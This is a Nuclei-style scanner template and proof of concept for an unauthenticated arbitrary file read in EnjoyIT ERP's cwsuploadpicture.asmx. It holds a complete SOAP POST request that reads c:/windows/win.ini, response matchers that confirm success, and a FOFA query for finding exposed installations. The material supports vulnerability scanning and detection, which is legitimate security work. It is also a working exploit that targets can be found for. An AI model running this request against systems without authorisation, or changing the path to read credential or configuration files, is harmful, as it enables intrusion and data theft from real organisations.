config/pocs/enjoyit-erp-cwsuploadpicture-fileread.yaml

id: enjoyit-erp-cwsuploadpicture-fileread

info:
  name: EnjoyIT ERP CWSUploadPicture.asmx - File Read
  author: qwtd
  severity: high
  description: |-
    There is an arbitrary file reading vulnerability at the interface of EnjoyIT ERP cwsuplotpicture.amx, which can be exploited by unauthenticated attackers to read important system files
  reference:
    - https://github.com/wy876/POC/blob/main/%E6%98%82%E6%8D%B7ERP/%E6%98%82%E6%8D%B7CRM%E7%B3%BB%E7%BB%9Fcwsuploadpicture.asmx%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md
  metadata:
    fofa: body="/ClientBin/slEnjoy.App.xap"
  tags: 昂捷-ERP

http:
  - raw:
      - |
        POST /enjoyRMIS_WS/WS/Common/cwsuploadpicture.asmx HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: "http://tempuri.org/GetPicture"

        <?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetPicture xmlns="http://tempuri.org/">
              <sFullFileName>c:/windows/win.ini</sFullFileName>
            </GetPicture>
          </soap:Body>
        </soap:Envelope>

    matchers-condition: and
    matchers:
      - type: word
        words:
          - "GetPictrueResponse"
      - type: status
        status:
          - 200